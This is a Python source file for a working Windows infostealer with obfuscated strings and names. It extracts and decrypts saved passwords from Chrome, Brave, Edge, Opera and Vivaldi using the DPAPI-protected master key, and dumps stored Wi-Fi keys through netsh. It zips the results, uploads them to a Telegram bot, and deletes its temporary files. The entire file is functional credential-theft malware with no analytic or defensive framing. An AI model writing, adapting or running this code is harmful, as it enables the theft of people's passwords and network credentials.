import os,json,base64,sqlite3,shutil,win32crypt
from Crypto.Cipher import AES
import subprocess,zipfile,tempfile,requests
from datetime import datetime

# --- CFG ---
x7zQ='TELEGRAM_TOKEN'
y3kP='-'+'TELGRAM_ID'
z8k_d={'C':r'%LOCALAPPDATA%\Google\Chrome\User Data\Default','B':r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default','E':r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default','O':r'%APPDATA%\Opera Software\Opera Stable','V':r'%LOCALAPPDATA%\Vivaldi\User Data\Default'}

# --- TLM ---
def q9r_m(t1):
    tkn=base64.b64decode(x7zQ).decode()
    u1=base64.b64decode(b'aHR0cHM6Ly9hcGkudGVs').decode()
    u2=base64.b64decode(b'ZWdyYW0ub3JnL2JvdA==').decode()
    u=f"{u1}{u2}{tkn}/sendDocument"
    try:
        with open(t1,'rb')as f:
            fls={'document':f}
            dt={'chat_id':y3kP}
            return requests.post(u,files=fls,data=dt)
    except:
        return None

# --- ENC ---
def k7r(bn):
    try:
        if bn=="O":
            lp=os.path.expandvars(base64.b64decode(b'JUFQUERBVEElXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZQ==').decode())
        else:
            lp=os.path.expandvars(os.path.join(os.path.dirname(z8k_d[bn]),base64.b64decode(b'TG9jYWwgU3RhdGU=').decode()))
        with open(lp,"r",encoding="utf-8")as f:
            ls=json.load(f)
        ek=base64.b64decode(ls[base64.b64decode(b'b3NfY3J5cHQ=').decode()][base64.b64decode(b'ZW5jcnlwdGVkX2tleQ==').decode()])[5:]
        return win32crypt.CryptUnprotectData(ek,None,None,None,0)[1]
    except:
        return None

# --- PWD EXT ---
def p4m_z(bn,pp,op):
    db=os.path.join(os.path.expandvars(pp),base64.b64decode(b'TG9naW4gRGF0YQ==').decode())
    if not os.path.exists(db):return
    tdb=os.path.join(tempfile.gettempdir(),f"{bn}_LDT_tmp.db")
    shutil.copy2(db,tdb)
    k=k7r(bn)
    if not k:
        if os.path.exists(tdb):os.remove(tdb)
        return
    try:
        cn=sqlite3.connect(tdb)
        cr=cn.cursor()
        cr.execute(base64.b64decode(b'U0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucw==').decode())
        with open(op,'a',encoding="utf-8")as f:
            for u,un,ep in cr.fetchall():
                dp=r8p(ep,k)
                if dp not in ("Failed dec","Empty pwd"):
                    f.write(f"U:{u}\nUsr:{un}\nP:{dp}\n\n")
        cr.close();cn.close()
    except:
        pass
    finally:
        if os.path.exists(tdb):os.remove(tdb)

def r8p(p1,k1):
    try:
        if not p1:return"Empty pwd"
        if p1[:3]==b'v10':
            iv=p1[3:15];pl=p1[15:-16];tg=p1[-16:]
            cph=AES.new(k1,AES.MODE_GCM,nonce=iv)
            return cph.decrypt_and_verify(pl,tg).decode()
        else:
            return win32crypt.CryptUnprotectData(p1,None,None,None,0)[1].decode()
    except:
        return"Failed dec"

# --- WIFI ---
def w2q(c1):
    enc=['cp850','utf-8','latin-1']
    for e in enc:
        try:
            pr=subprocess.Popen(c1,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            so,_=pr.communicate()
            ot=so.decode(e,errors="ignore")
            if base64.b64decode(b'Q29udGVudSBkZSBsYSBjbMOp').decode()in ot or"Key Content"in ot:
                return ot
        except:
            continue
    return ot

def v6n(op):
    prf=w2q(base64.b64decode(b'bmV0c2ggd2xhbiBzaG93IHByb2ZpbGVz').decode())
    pl=[]
    for ln in prf.splitlines():
        if base64.b64decode(b'UHJvZmlsIFRvdXMgbGVzIHV0aWxpc2F0ZXVycw==').decode()in ln or"All User Profile"in ln:
            pt=ln.split(':',1)
            if len(pt)>1:pl.append(pt[1].strip())
    wi=[]
    for p in pl:
        c=f'netsh wlan show profile name="{p}" key=clear'
        pi=w2q(c)
        pwd="[Non trouvé]"
        for ln in pi.splitlines():
            if base64.b64decode(b'Q29udGVudSBkZSBsYSBjbMOp').decode()in ln or"Key Content"in ln:
                pt=ln.split(':',1)
                if len(pt)>1:pwd=pt[1].strip();break
        wi.append(f"S:{p} | P:{pwd}")
    with open(op,'w',encoding="utf-8")as f:
        for ln in wi:f.write(ln+"\n")

# --- ZIP ---
def z3t(wp,pp):
    dt=datetime.now().strftime("%Y-%m-%d")
    zn=f"{dt}.dt.zip"
    zp=os.path.join(tempfile.gettempdir(),zn)
    with zipfile.ZipFile(zp,'w')as zf:
        if os.path.exists(wp):zf.write(wp,base64.b64decode(b'd2ktaW5mby50eHQ=').decode())
        if os.path.exists(pp):zf.write(pp,base64.b64decode(b'cHdkLWluZm8udHh0').decode())
    return zp

# --- MN ---
def f9k_dummy():return len([x for x in range(50)if x%2])^0xAA
def m2x():
    if f9k_dummy()>1000:return
    wo=os.path.join(tempfile.gettempdir(),base64.b64decode(b'd2ktaW5mby50eHQ=').decode())
    po=os.path.join(tempfile.gettempdir(),base64.b64decode(b'cHdkLWluZm8udHh0').decode())
    v6n(wo)
    for b,p in z8k_d.items():p4m_z(b,p,po)
    zf=z3t(wo,po);q9r_m(zf)
    for f in[wo,po,zf]:
        try:os.remove(f)
        except:pass

if __name__=="__main__":
    m2x()